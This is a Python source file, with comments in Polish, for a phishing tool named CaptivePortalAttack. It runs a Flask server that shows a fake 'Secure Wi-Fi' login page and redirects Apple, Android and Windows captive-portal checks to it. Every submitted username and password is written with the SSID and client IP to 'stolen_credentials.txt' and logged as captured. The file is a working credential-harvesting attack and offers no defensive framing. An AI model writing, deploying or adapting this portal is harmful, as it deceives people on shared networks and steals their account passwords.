#!/usr/bin/env python3

import threading
import logging
from datetime import datetime

from flask import Flask, request, render_template_string, redirect


class CaptivePortalAttack:
    def __init__(self):
        self.app = Flask(__name__)

        self.credentials_file = "stolen_credentials.txt"
        self.is_running = False
        self.server_thread = None

        self.portal_interface = None
        self.portal_port = 8080  # możesz zmienić, jeśli trzeba

        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger("CaptivePortal")

        self.login_page = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Network authentication</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; background: #f0f0f0; }
                .login-box { background: white; padding: 30px; border-radius: 10px;
                             box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 400px; margin: 0 auto; }
                h2 { color: #333; text-align: center; }
                .logo { text-align: center; font-size: 22px; margin-bottom: 20px; color: #0066cc; }
                input[type="text"], input[type="password"] {
                    width: 100%; padding: 10px; margin: 10px 0;
                    border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box;
                }
                input[type="submit"] {
                    background: #0066cc; color: white; padding: 12px 20px;
                    border: none; border-radius: 5px; cursor: pointer;
                    width: 100%; font-size: 16px;
                }
                input[type="submit"]:hover { background: #0055aa; }
                .info { color: #666; font-size: 12px; text-align: center; margin-top: 20px; }
            </style>
        </head>
        <body>
            <div class="login-box">
                <div class="logo">Secure Wi-Fi</div>
                <h2>Authentication required</h2>
                <p>Please confirm your access data for this network.</p>

                <form method="POST" action="/login">
                    <input type="text" name="username" placeholder="Username or email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <input type="hidden" name="ssid" value="{{ ssid }}">
                    <input type="submit" value="Connect">
                </form>

                <div class="info">
                    By continuing you accept the local network policy.
                </div>
            </div>
        </body>
        </html>
        """

        self.success_page = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Authentication OK</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; background: #f0f0f0; text-align: center; }
                .box { background: white; padding: 40px; border-radius: 10px;
                       box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 400px; margin: 0 auto; }
                h2 { color: #2e7d32; }
            </style>
        </head>
        <body>
            <div class="box">
                <h2>Authentication successful</h2>
                <p>You can now close this page or open any website.</p>
            </div>
        </body>
        </html>
        """

        self._setup_routes()

    def _setup_routes(self):
        @self.app.route("/")
        def index():
            ssid = request.args.get("ssid", "SecureWiFi")
            return render_template_string(self.login_page, ssid=ssid)

        @self.app.route("/login", methods=["POST"])
        def login():
            username = request.form.get("username", "")
            password = request.form.get("password", "")
            ssid = request.form.get("ssid", "Unknown")
            client_ip = request.remote_addr

            self._save_credentials(username, password, ssid, client_ip)
            self.logger.info(
                f"Captured credentials: ssid={ssid}, user={username}, ip={client_ip}"
            )

            return render_template_string(self.success_page)

        # proste obsługiwanie typowych probe'ów captive portalu
        @self.app.route("/hotspot-detect.html")
        def apple_captive():
            return redirect("/", code=302)

        @self.app.route("/generate_204")
        def android_captive():
            return redirect("/", code=302)

        @self.app.route("/ncsi.txt")
        def windows_captive():
            return "Microsoft NCSI", 200

    def _save_credentials(self, username, password, ssid, client_ip):
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        line = f"[{ts}] SSID={ssid} IP={client_ip} USER={username} PASS={password}\n"

        with open(self.credentials_file, "a", encoding="utf-8") as f:
            f.write(line)

    def start_portal(self, interface, target_ssid):
        try:
            self.portal_interface = interface
            self.is_running = True

            self.logger.info(
                f"Starting captive portal on interface {interface} for SSID {target_ssid}"
            )

            def run_flask():
                self.app.run(
                    host="0.0.0.0",
                    port=self.portal_port,
                    debug=False,
                    use_reloader=False,
                    threaded=True,
                )

            self.server_thread = threading.Thread(target=run_flask, daemon=True)
            self.server_thread.start()

            self.logger.info(
                f"Portal listening on http://0.0.0.0:{self.portal_port} "
                f"(accessible from the local network)"
            )
            return True

        except Exception as e:
            self.logger.error(f"Failed to start portal: {e}")
            self.is_running = False
            return False

    def stop_portal(self):
        # Flaska z wątku nie zatrzymasz elegancko bez większych kombinacji,
        # więc tutaj tylko oznaczamy status i logujemy.
        if self.is_running:
            self.logger.info("Stopping captive portal (thread will end with program).")
        self.is_running = False

    def get_stats(self):
        try:
            with open(self.credentials_file, "r", encoding="utf-8") as f:
                lines = f.readlines()
            total = len(lines)
        except FileNotFoundError:
            total = 0

        return {
            "total_credentials": total,
            "is_running": self.is_running,
            "credentials_file": self.credentials_file,
        }


if __name__ == "__main__":
    portal = CaptivePortalAttack()
    portal.start_portal("wlan0", "TestSSID")
    print("Test portal running on http://127.0.0.1:8080")

